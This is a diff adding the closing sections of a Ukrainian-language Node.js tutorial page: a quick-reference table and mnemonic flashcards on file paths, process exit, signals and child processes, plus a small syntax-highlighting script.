+        <tr><td>Файл не існує?</td><td>роби операцію, лови <code>err.code === 'ENOENT'</code> (без existsSync)</td></tr>
+        <tr><td>Шлях від модуля</td><td><code>__dirname</code> / <code>import.meta.dirname</code>; URL → <code>fileURLToPath</code></td></tr>
+        <tr><td>join vs resolve</td><td>join — склеїти; resolve — абсолютний, справа наліво, від cwd</td></tr>
+        <tr><td>Захист від traversal</td><td><code>resolve(root, input).startsWith(root + sep)</code></td></tr>
+        <tr><td>Вихід з кодом</td><td><code>process.exitCode = n</code>; <code>exit()</code> — лише force</td></tr>
+        <tr><td>Graceful shutdown</td><td>SIGTERM → <code>server.close()</code> → закрити ресурси → таймер-страховка <code>.unref()</code></td></tr>
+        <tr><td>Виміряти час</td><td><code>process.hrtime.bigint()</code>, CPU — <code>process.cpuUsage(prev)</code></td></tr>
+        <tr><td>Запустити команду безпечно</td><td><code>execFile(cmd, [args])</code> / <code>spawn(cmd, [args])</code>, не exec з інтерполяцією</td></tr>
+        <tr><td>Великий вивід дитини</td><td><code>spawn</code> + стріми; чекати <code>'close'</code></td></tr>
+        <tr><td>Node-дитина з повідомленнями</td><td><code>fork(path)</code> + <code>send</code>/<code>'message'</code>, <code>disconnect()</code></td></tr>
+        <tr><td>Вбити дерево</td><td><code>detached: true</code> + <code>process.kill(-pid)</code></td></tr>
+        <tr><td>CLI</td><td>shebang + <code>bin</code> + <code>util.parseArgs</code> + <code>readline/promises</code> + <code>util.styleText</code></td></tr>
+        <tr><td>.env / watch / права</td><td><code>--env-file</code> · <code>--watch</code> · <code>--permission --allow-fs-read=...</code></td></tr>
+        <tr><td>Ядра в контейнері</td><td><code>os.availableParallelism()</code> або явний env</td></tr>
+      </table></div>
+    </section>
+
+    <section id="s16">
+      <h2><span class="num">16</span> Як запам'ятати</h2>
+      <p class="section-desc">Короткі образи для кожної ключової ідеї.</p>
+      <div class="flashgrid">
+        <div class="flashcard">
+          <div class="fc-num">1</div>
+          <div class="term">*Sync API</div>
+          <div class="def">Блокує event loop; ок на старті й у CLI.</div>
+          <div class="mnemo"><b>Асоціація:</b> прибирати ресторан до відкриття — нормально; посеред обіду, коли зал повний, — ні.</div>
+        </div>
+        <div class="flashcard">
+          <div class="fc-num">2</div>
+          <div class="term">temp + rename</div>
+          <div class="def">Атомарний запис: читач бачить або старе, або нове.</div>
+          <div class="mnemo"><b>Асоціація:</b> готуєш нову вітрину за ширмою і знімаєш ширму одним рухом.</div>
+        </div>
+        <div class="flashcard">
+          <div class="fc-num">3</div>
+          <div class="term">path.resolve</div>
+          <div class="def">Справа наліво до першого абсолютного, інакше від cwd.</div>
+          <div class="mnemo"><b>Асоціація:</b> серія команд <code>cd</code> — <code>cd /b</code> посередині перекреслює все, що було до нього.</div>
+        </div>
+        <div class="flashcard">
+          <div class="fc-num">4</div>
+          <div class="term">exitCode vs exit()</div>
+          <div class="def">exitCode — вийти, коли все дописано; exit() — обірвати зараз.</div>
+          <div class="mnemo"><b>Асоціація:</b> сказати "останнє замовлення" в барі vs вимкнути світло, поки люди ще п'ють.</div>
+        </div>
+        <div class="flashcard">
+          <div class="fc-num">5</div>
+          <div class="term">SIGTERM vs SIGKILL</div>
+          <div class="def">SIGTERM — прохання (можна прибрати за собою), SIGKILL — неперехоплюване вбивство.</div>
+          <div class="mnemo"><b>Асоціація:</b> "готель закривається за 30 секунд, збирайте речі" vs охоронець виносить вас разом з ліжком.</div>
+        </div>
+        <div class="flashcard">
+          <div class="fc-num">6</div>
+          <div class="term">128 + N</div>
+          <div class="def">Код виходу процесу, вбитого сигналом N: 137 = KILL, 143 = TERM.</div>
+          <div class="mnemo"><b>Асоціація:</b> "137 — вбили сім раз" (…7), "143 — попросили по-доброму".</div>
+        </div>
+        <div class="flashcard">
+          <div class="fc-num">7</div>
+          <div class="term">exec</div>
+          <div class="def">Єдиний варіант через shell — і єдиний з shell injection за замовчуванням.</div>
+          <div class="mnemo"><b>Асоціація:</b> передати записку через перекладача-імпровізатора: він може "додати від себе".</div>
+        </div>
+        <div class="flashcard">
+          <div class="fc-num">8</div>
+          <div class="term">spawn</div>
+          <div class="def">Без shell, вивід стрімами — для довгих процесів і великого виводу.</div>
+          <div class="mnemo"><b>Асоціація:</b> водопровід (тече постійно) vs відро (exec — набрали і принесли все разом).</div>
+        </div>
+        <div class="flashcard">
+          <div class="fc-num">9</div>
+          <div class="term">fork</div>
+          <div class="def">Новий Node-процес з IPC-каналом send/'message'.</div>
+          <div class="mnemo"><b>Асоціація:</b> найняти помічника в інший офіс і дати йому рацію.</div>
+        </div>
+        <div class="flashcard">
+          <div class="fc-num">10</div>
+          <div class="term">--permission</div>
+          <div class="def">Запобіжник прав на fs/процеси/воркери, не пісочниця.</div>
+          <div class="mnemo"><b>Асоціація:</b> ремінь безпеки: рятує в типовій аварії, але не робить з машини танк.</div>
+        </div>
+      </div>
+    </section>
+
+    </article>
+  </div>
+</div>
+
+<footer class="page">
+  Node.js Doc · частина серії туторіалів AI Delivery Planner. Приклади коду перевірені на Node.js 24.
+</footer>
+
+<script>
+(function(){
+  function esc(s){
+    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+  var RE = /(\/\/[^\n]*)|(\/\*[\s\S]*?\*\/)|(`(?:\\.|[^`\\])*`)|('(?:\\.|[^'\\\n])*'|"(?:\\.|[^"\\\n])*")|(\b\d[\d_]*\.?[\d_]*(?:[eE][+-]?\d+)?n?\b)|(\bfunction\s*\*?\s+)([A-Za-z_$][\w$]*)|(\bclass\s+)([A-Za-z_$][\w$]*)|((?<!\.)\b(?:function|return|if|else|for|while|do|break|continue|switch|case|default|class|extends|super|new|delete|typeof|instanceof|in|of|try|catch|finally|throw|async|await|yield|import|export|from|as|static|get|set|void|let|const|var|null|undefined|true|false|this)\b)/g;
+  function hl(text){
+    var out = '', last = 0, m;
+    RE.lastIndex = 0;
+    while((m = RE.exec(text))){
+      if(m.index > last) out += esc(text.slice(last, m.index));
+      if(m[1] !== undefined) out += '<span class="tok-com">'+esc(m[1])+'</span>';
+      else if(m[2] !== undefined) out += '<span class="tok-com">'+esc(m[2])+'</span>';
+      else if(m[3] !== undefined) out += '<span class="tok-str">'+esc(m[3])+'</span>';
+      else if(m[4] !== undefined) out += '<span class="tok-str">'+esc(m[4])+'</span>';
+      else if(m[5] !== undefined) out += '<span class="tok-num">'+esc(m[5])+'</span>';
+      else if(m[6] !== undefined) out += '<span class="tok-kw">'+esc(m[6])+'</span><span class="tok-def">'+esc(m[7])+'</span>';
+      else if(m[8] !== undefined) out += '<span class="tok-kw">'+esc(m[8])+'</span><span class="tok-def">'+esc(m[9])+'</span>';
+      else if(m[10] !== undefined) out += '<span class="tok-kw">'+esc(m[10])+'</span>';
+      last = RE.lastIndex;
+    }
+    out += esc(text.slice(last));
+    return out;
+  }
+  var blocks = document.querySelectorAll('.codecard pre code');
+  for(var i=0;i<blocks.length;i++){
+    blocks[i].innerHTML = hl(blocks[i].textContent);
+  }
+})();
+</script>
+</body>
+</html>
